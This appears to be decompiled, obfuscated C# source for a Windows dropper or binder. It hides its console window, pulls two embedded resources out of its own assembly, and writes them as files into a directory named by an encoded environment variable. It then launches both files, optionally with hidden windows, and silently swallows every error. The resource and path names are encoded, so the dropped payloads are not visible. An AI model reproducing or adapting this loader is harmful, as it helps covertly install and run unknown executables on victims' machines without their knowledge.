using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ns0;

internal sealed class Class0
{
	public static FileStream fileStream_0;

	public static FileStream fileStream_1;

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	private unsafe static void Main(string[] args)
	{
		void* ptr = stackalloc byte[6];
		try
		{
			FreeConsole();
			*(sbyte*)ptr = 0;
			((byte*)ptr)[1] = 0;
			((byte*)ptr)[2] = 0;
			((byte*)ptr)[3] = 0;
			((byte*)ptr)[4] = 0;
			((byte*)ptr)[5] = 0;
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class2.smethod_0(1));
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			manifestResourceStream.Close();
			Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class2.smethod_0(12));
			byte[] array2 = new byte[manifestResourceStream2.Length];
			manifestResourceStream2.Read(array2, 0, array2.Length);
			if (((byte*)ptr)[1] != 0)
			{
				fileStream_0 = new FileStream(Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(32), FileMode.Create);
			}
			else if (((byte*)ptr)[2] != 0)
			{
				fileStream_0 = new FileStream(Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(45), FileMode.Create);
			}
			else
			{
				fileStream_0 = new FileStream(Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(58), FileMode.Create);
			}
			fileStream_0.Write(array, 0, array.Length);
			fileStream_0.Close();
			fileStream_0.Dispose();
			if (((byte*)ptr)[3] != 0)
			{
				fileStream_1 = new FileStream(Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(71), FileMode.Create);
			}
			else
			{
				fileStream_1 = new FileStream(Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(84), FileMode.Create);
			}
			fileStream_1.Write(array2, 0, array2.Length);
			fileStream_1.Close();
			fileStream_1.Dispose();
			Process process = new Process();
			if (((byte*)ptr)[1] != 0)
			{
				process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(32);
			}
			else if (((byte*)ptr)[2] != 0)
			{
				process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(45);
			}
			else
			{
				process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(58);
			}
			if (((byte*)ptr)[5] != 0)
			{
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			process.Start();
			if (((byte*)ptr)[4] != 0)
			{
				process.WaitForExit();
			}
			Process process2 = new Process();
			if (((byte*)ptr)[3] != 0)
			{
				process2.StartInfo.FileName = Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(71);
			}
			else
			{
				process2.StartInfo.FileName = Environment.GetEnvironmentVariable(Class2.smethod_0(23)) + Class2.smethod_0(84);
			}
			if (*(bool*)ptr)
			{
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			process2.Start();
		}
		catch
		{
		}
	}
}
